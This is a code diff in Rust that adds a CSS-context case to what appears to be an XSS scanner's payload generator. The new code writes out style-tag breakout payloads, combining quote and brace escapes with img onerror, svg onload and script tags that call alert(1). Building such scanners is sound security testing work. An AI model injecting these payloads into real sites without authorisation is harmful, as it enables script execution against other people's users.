@@ -149,6 +149,38 @@ pub fn generate_dynamic_payloads(context: &InjectionContext) -> Vec<String> {
                 }
             }
         }
+        InjectionContext::Css(delimiter_type) => {
+            // CSS injection: break out of <style> tag and inject HTML
+            let class_marker = crate::scanning::markers::class_marker();
+            let id_marker = crate::scanning::markers::id_marker();
+            let breakout_tags = vec![
+                format!("<IMG src=x onerror=alert(1) ClAss={}>", class_marker),
+                format!("<SVG onload=alert(1) ClAss={}>", class_marker),
+                format!("<SVG/onload=alert(1) id={}>", id_marker),
+                format!("<SCRIPT>alert(1)</SCRIPT>"),
+            ];
+            match delimiter_type {
+                Some(DelimiterType::SingleQuote) => {
+                    for tag in &breakout_tags {
+                        payloads.push(format!("');}}</style>{}", tag));
+                        payloads.push(format!("');}}</style>{}<!--", tag));
+                    }
+                }
+                Some(DelimiterType::DoubleQuote) => {
+                    for tag in &breakout_tags {
+                        payloads.push(format!("\");}}</style>{}", tag));
+                        payloads.push(format!("\");}}</style>{}<!--", tag));
+                    }
+                }
+                _ => {
+                    for tag in &breakout_tags {
+                        payloads.push(format!("</style>{}", tag));
+                        payloads.push(format!("}}</style>{}", tag));
+                        payloads.push(format!(";}}</style>{}", tag));
+                    }
+                }
+            }
+        }
     }
 
     payloads
